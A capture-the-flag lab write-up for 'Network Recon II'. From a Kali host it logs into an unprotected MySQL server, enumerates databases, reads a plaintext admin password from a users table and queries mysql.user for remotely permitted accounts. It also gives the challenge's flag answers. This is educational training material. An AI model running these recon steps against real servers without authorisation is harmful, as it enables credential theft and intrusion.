# Network Recon II

## Challenge Description
A web application uses MySQL server as the database server. The attacker has sneaked into the network on which the MySQL server is present.

Please answer the following questions:
1. Find the name of the database which contains the table 'endpoints'.
2. Find the password of 'admin' user stored in 'users' table in 'webapp_settings' database.
3. Which user other than root can connect to the MySQL server remotely?

## Instructions
* Once you start the lab, you will have access to a root terminal of a Kali instance
* Your Kali has an interface with IP address 192.X.Y.2. Run "ip addr" to know the values of X and Y.
* The Target machine should be located at the IP address 192.X.Y.3. 

---

## Solution

Following the instructions, we can find the IP address by using `ip addr`. In this case, the target machine has an address of `192.66.1.3`.

We can connect to a remote MySQL server by using the `mysql` command with the `-h` option, which stands for `--host`, to specify the IP address:
```
root@attackdefense:~# mysql -h 192.66.1.3
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 43
Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```

We can now proceed with finding the flags.

### 1. Find name of database containing table `endpoints`

Using the `show` command, we can list the databases:
```
MySQL [(none)]> show schemas
    -> ;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| data               |
| management         |
| mysql              |
| performance_schema |
| webapp_settings    |
+--------------------+
6 rows in set (0.001 sec)
```

I'm not sure if there's a more efficient way to do this (I couldn't find any), but I manually looked through the databases and listed the tables. Eventually, I found the database containing the table `endpoints`:
```
MySQL [management]> use data;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [data]> show tables;
+------------------+
| Tables_in_data   |
+------------------+
| developer_manual |
| doc              |
| endpoints        |
| issues           |
+------------------+
4 rows in set (0.000 sec)
```

#### Flag 1:
```
data
```

### 2. Find password of `admin`

Firstly, we have to switch to the `webapp_settings` database, and look in the `users` table:
```
MySQL [data]> use webapp_settings;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

To get a clearer idea of what the table looks like, we can use the `describe` command:
```
MySQL [webapp_settings]> describe users;           
+-------------+--------------+------+-----+---------+----------------+
| Field       | Type         | Null | Key | Default | Extra          |
+-------------+--------------+------+-----+---------+----------------+
| id          | int(11)      | NO   | PRI | NULL    | auto_increment |
| username    | varchar(255) | YES  |     | NULL    |                |
| password    | varchar(255) | YES  |     | NULL    |                |
| role        | varchar(255) | YES  |     | NULL    |                |
| is_active   | tinyint(1)   | YES  |     | NULL    |                |
| date_joined | varchar(255) | YES  |     | NULL    |                |
+-------------+--------------+------+-----+---------+----------------+
6 rows in set (0.001 sec)
```

Then, we can use normal SQL syntax to get the password of `admin`:
```
MySQL [webapp_settings]> select password from users where username = 'admin';
+-----------+
| password  |
+-----------+
| admin@123 |
+-----------+
1 row in set (0.000 sec)
```

Plaintext password storage. Shameful.

#### Flag 2:
```
admin@123
```

### 3. Find other user that can connect remotely

This information is likely stored in the `mysql` database, so let's switch to that one, and see what tables we have to work with:
```
MySQL [performance_schema]> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [mysql]> show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| ndb_binlog_index          |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| servers                   |
| slow_log                  |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| user                      |
+---------------------------+
24 rows in set (0.001 sec)
```

Let's look in the `user` table. By doing `describe user`, we can find the columns in the table. (Unfortunately I didn't manage to copy the output for that command, so I can't show it here)

We can see that there's a `Host` and a `User` column, so let's take a look at those:
```
MySQL [mysql]> select Host, User from user;
+--------------+------------------+
| Host         | User             |
+--------------+------------------+
| %            | Developer        |
| %            | root             |
| 127.0.0.1    | root             |
| 86cc49b05b1a | root             |
| ::1          | root             |
| localhost    | alice            |
| localhost    | bob              |
| localhost    | dbadmin          |
| localhost    | debian-sys-maint |
| localhost    | jim              |
| localhost    | root             |
+--------------+------------------+
11 rows in set (0.000 sec)
```

In MySQL, `%` is a wildcard matching any number of characters – in this context, effectively allowing connection from any host. We can see that the other users can only connect from localhost, and besides `root`, the only other user that can connect from any host is `Developer`.

#### Flag 3:
```
Developer
```
